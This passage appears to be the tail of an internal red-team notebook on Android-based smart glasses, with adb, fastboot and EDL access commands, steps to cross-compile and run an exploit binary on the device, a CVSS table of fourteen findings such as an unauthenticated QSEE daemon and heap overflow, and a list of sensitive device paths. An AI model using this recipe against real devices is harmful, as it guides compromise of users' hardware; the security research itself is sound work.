# → uid=2000(shell) gid=2000(shell) groups=...
```

### Enter Fastboot

```bash
adb reboot recovery
# On glasses: navigate to "Enter fastboot" → long-press to select
fastboot devices
# → 33115a5c    fastboot
```

### Enter EDL 9008

```bash
adb reboot edl
# Device appears as QDLoader 9008 on COM10
# WARNING: May require sahara_reset_v2.py + USB cycle to exit!
```

### Exit EDL (Recovery)

```bash
python sahara_reset_v2.py
# If Strategy 3 acknowledges but device stays in EDL:
# In admin PowerShell:
$dev = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*QDLoader*" }
Disable-PnpDevice -InstanceId $dev.InstanceId -Confirm:$false
Start-Sleep 3
Enable-PnpDevice -InstanceId $dev.InstanceId -Confirm:$false
# Device should re-enumerate as normal ADB
```

### Port Forward for GateServiced

```bash
adb forward tcp:8341 tcp:8341
# Now connect to 127.0.0.1:8341 from host
```

### Cross-Compile for Device

```bash
$CC = "C:\Users\<USER>\AppData\Local\Android\Sdk\ndk\29.0.14206865\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android31-clang.exe"
& $CC -O2 -Wall -o exploit.out exploit.c -static
adb push exploit.out /data/local/tmp/
adb shell chmod +x /data/local/tmp/exploit.out
adb shell /data/local/tmp/exploit.out
```

### Disassemble with NDK

```bash
$NDK = "C:\Users\<USER>\AppData\Local\Android\Sdk\ndk\29.0.14206865\toolchains\llvm\prebuilt\windows-x86_64\bin"
& "$NDK\llvm-objdump.exe" -d --start-address=0x2A70 --stop-address=0x2E4B extracted_bins\libc.so
& "$NDK\llvm-readelf.exe" --dyn-syms extracted_bins\libc.so
```

---

## 17. CVSS Security Audit

| #   | Finding                                | CVSS 4.0 | Category           | Status                       |
| --- | -------------------------------------- | -------- | ------------------ | ---------------------------- |
| 1   | GateServiced: Unauthenticated QSEE     | 9.8      | Access Control     | Confirmed, unpatched         |
| 2   | GateServiced: DMA Heap Overflow        | 8.6      | Memory Safety      | Confirmed, 100% reproducible |
| 3   | TrustZoneAccessService: No permissions | 8.1      | Access Control     | Confirmed via APK analysis   |
| 4   | GateServiced: No TLS                   | 7.5      | Confidentiality    | Confirmed                    |
| 5   | CVE-2025-21479: KGSL Cross-FD          | 7.8      | Isolation Bypass   | Confirmed, per-process only  |
| 6   | GateServiced: ASLR Leak                | 6.8      | Info Disclosure    | Confirmed via crash dumps    |
| 7   | OTA Creds in System Properties         | 6.5      | Credential Mgmt    | Confirmed                    |
| 8   | 5 Debuggable Apps in Production        | 5.5      | Hardening          | Confirmed                    |
| 9   | GateServiced: NULL Deref Race          | 5.3      | Availability       | Confirmed, DoS only          |
| 10  | GateServiced: Hardcoded TA Path        | 4.3      | Hardening          | Confirmed                    |
| 11  | Bootloader Unlocked on Production      | 9.8      | Firmware Integrity | Confirmed (orange state)     |
| 12  | Security Patch 19 Months Outdated      | 9.1      | Patch Management   | 2024-07-05, 19 months behind |
| 13  | I2C PMIC Writable by Shell             | 6.2      | Hardware Access    | Confirmed                    |
| 14  | RokidSysConfig dump() Bypass           | 4.8      | Access Control     | Confirmed via APK analysis   |

---

## Appendix A: Key File Locations on Device

```
/vendor/bin/GateServiced                              # Target daemon
/vendor/firmware/widevine.mbn                         # Loadable TA
/apex/com.android.runtime/lib64/bionic/libc.so        # libc for offsets
/dev/block/mmcblk0p17                                 # boot_a partition
/dev/block/mmcblk0p18                                 # boot_b partition
/dev/kgsl-3d0                                         # GPU driver
/dev/i2c-1                                            # I2C bus
/dev/rt600_spidev                                     # SPI
/dev/ttyHS0                                           # Serial
/mnt/vendor/qmcs/                                     # Writable dir (777)
/data/tombstones/                                     # Crash dumps (ASLR leaks)
```

## Appendix B: Phone for Magisk Patching

```
Serial: <PHONE_SERIAL>
Used for: Pushing boot.img → Magisk patch → Pull patched image
```

---

_Last Updated: 2026-02-11 (Session 22)_
_Classification: INTERNAL — RED TEAM ONLY_
